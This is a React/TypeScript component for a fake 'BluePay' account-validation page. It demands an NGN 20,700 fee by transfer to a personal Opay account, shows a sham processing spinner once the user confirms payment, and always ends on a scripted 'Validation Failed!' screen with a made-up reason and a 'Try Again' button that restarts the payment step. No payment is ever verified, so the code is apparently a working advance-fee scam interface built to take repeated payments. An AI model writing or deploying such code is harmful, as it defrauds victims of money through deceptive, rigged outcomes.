
import React, { useState } from 'react';
import { ArrowLeft, Copy, X } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

interface AccountValidationPageProps {
  onBack: () => void;
  userEmail: string;
  userName: string;
}

const AccountValidationPage: React.FC<AccountValidationPageProps> = ({ onBack, userEmail, userName }) => {
  const [step, setStep] = useState('form'); // form, loading, payment, processing, failed
  const [fullName, setFullName] = useState(userName);
  const [email, setEmail] = useState(userEmail);

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setStep('loading');
    setTimeout(() => {
      setStep('payment');
    }, 4000);
  };

  const handlePaymentConfirm = () => {
    setStep('processing');
    setTimeout(() => {
      setStep('failed');
    }, 8000);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (step === 'form') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-blue-600 px-4 py-4 flex items-center gap-3">
          <button onClick={onBack} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Account Validation</h1>
        </div>

        <div className="p-4 space-y-6">
          <div>
            <h2 className="text-xl font-bold text-gray-900 mb-2">Validate Your Account</h2>
            <p className="text-gray-600 mb-6">
              Complete account validation to unlock higher transaction limits and premium features.
            </p>
          </div>

          <form onSubmit={handleFormSubmit} className="space-y-4">
            <div>
              <label className="block text-gray-700 text-sm mb-2">Validation Fee</label>
              <Input
                type="text"
                value="₦20700"
                readOnly
                className="h-12 rounded-xl border-2 border-gray-300 bg-gray-100 text-base"
              />
            </div>

            <div>
              <label className="block text-gray-700 text-sm mb-2">Full Name</label>
              <Input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="h-12 rounded-xl border-2 border-gray-300 text-base"
                placeholder="James chukwuemeka"
              />
            </div>

            <div>
              <label className="block text-gray-700 text-sm mb-2">Email Address</label>
              <Input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="h-12 rounded-xl border-2 border-gray-300 text-base"
                placeholder="James5@gmail.com"
              />
            </div>

            <Button
              type="submit"
              className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-base font-medium mt-6"
            >
              Proceed to Payment
            </Button>
          </form>
        </div>
      </div>
    );
  }

  if (step === 'loading') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 mx-auto mb-4">
            <div className="w-full h-full rounded-full border-4 border-blue-600 border-t-transparent animate-spin"></div>
          </div>
          <p className="text-gray-600">Preparing payment details...</p>
        </div>
      </div>
    );
  }

  if (step === 'payment') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-blue-600 px-4 py-4 flex items-center gap-3">
          <button onClick={onBack} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Account Validation</h1>
        </div>

        <div className="p-4 space-y-4">
          <div className="bg-green-100 p-3 rounded-lg flex items-center gap-2">
            <div className="w-8 h-8 bg-green-600 rounded flex items-center justify-center">
              <span className="text-white text-xs">💳</span>
            </div>
            <span className="text-green-800 font-medium">Account Validation Payment</span>
          </div>

          <div className="flex justify-between items-center">
            <div>
              <h2 className="text-2xl font-bold text-blue-600">BluePay</h2>
            </div>
            <div className="text-right">
              <p className="text-gray-600 text-sm">Validation Fee</p>
              <p className="text-lg font-semibold">Pay <span className="text-green-600">NGN 20,700</span></p>
            </div>
          </div>

          <div className="text-center mb-4">
            <h3 className="text-xl font-bold text-gray-900">Transfer NGN 20,700</h3>
          </div>

          <div className="bg-white rounded-xl p-4 space-y-4">
            <div className="flex justify-between items-center">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-gray-100 rounded flex items-center justify-center">
                  <span className="text-xs">🏦</span>
                </div>
                <span className="text-gray-700">BANK</span>
              </div>
              <span className="font-semibold">Opay</span>
            </div>

            <div className="flex justify-between items-center">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-gray-100 rounded flex items-center justify-center">
                  <span className="text-xs">📄</span>
                </div>
                <span className="text-gray-700">ACCOUNT</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="font-semibold">9046881405</span>
                <button onClick={() => copyToClipboard('9046881405')} className="p-1">
                  <Copy size={14} className="text-gray-500" />
                </button>
              </div>
            </div>

            <div className="flex justify-between items-center">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-gray-100 rounded flex items-center justify-center">
                  <span className="text-xs">👤</span>
                </div>
                <span className="text-gray-700">NAME</span>
              </div>
              <span className="font-semibold">Ebuka Sabastine</span>
            </div>

            <div className="flex justify-between items-center">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-gray-100 rounded flex items-center justify-center">
                  <span className="text-xs">💰</span>
                </div>
                <span className="text-gray-700">AMOUNT</span>
              </div>
              <span className="font-semibold">NGN 20,700</span>
            </div>
          </div>

          <div className="text-center">
            <p className="text-red-500 text-sm">Expires in <span className="font-semibold">29:54</span></p>
          </div>

          <Button
            onClick={handlePaymentConfirm}
            className="w-full h-12 bg-green-600 hover:bg-green-700 text-white rounded-xl text-base font-medium"
          >
            I've sent the money
          </Button>

          <div className="text-center">
            <button className="text-gray-600 text-sm flex items-center justify-center gap-2">
              <span>🔄</span>
              Change Payment Method
            </button>
          </div>
        </div>
      </div>
    );
  }

  if (step === 'processing') {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 mx-auto mb-4">
            <div className="w-full h-full rounded-full border-4 border-blue-600 border-t-transparent animate-spin"></div>
          </div>
          <p className="text-gray-600">Processing validation request...</p>
        </div>
      </div>
    );
  }

  if (step === 'failed') {
    return (
      <div className="min-h-screen bg-gray-50">
        <div className="bg-blue-600 px-4 py-4 flex items-center gap-3">
          <button onClick={onBack} className="text-white">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-lg font-semibold text-white">Account Validation</h1>
        </div>

        <div className="flex items-center justify-center min-h-[calc(100vh-80px)] p-4">
          <div className="text-center space-y-6 max-w-sm">
            <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center mx-auto">
              <X size={40} className="text-white" />
            </div>

            <div>
              <h2 className="text-2xl font-bold text-orange-600 mb-4">Validation Failed!</h2>
              <p className="text-gray-700 mb-2">
                Account validation could not be completed at this time.
              </p>
              <p className="text-gray-700 mb-6">
                <span className="font-medium">Reason:</span> Payment verification timeout or insufficient funds.
              </p>
            </div>

            <div className="bg-gray-100 rounded-lg p-4 flex items-center justify-between">
              <span className="text-gray-800">••••••••••••</span>
              <button className="text-gray-600">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
              </button>
            </div>

            <div className="space-y-3">
              <Button
                onClick={() => setStep('form')}
                className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-base font-medium"
              >
                Try Again
              </Button>
              
              <Button
                onClick={onBack}
                variant="outline"
                className="w-full h-12 border-gray-300 text-gray-700 rounded-xl text-base font-medium"
              >
                Back to Profile
              </Button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return null;
};

export default AccountValidationPage;
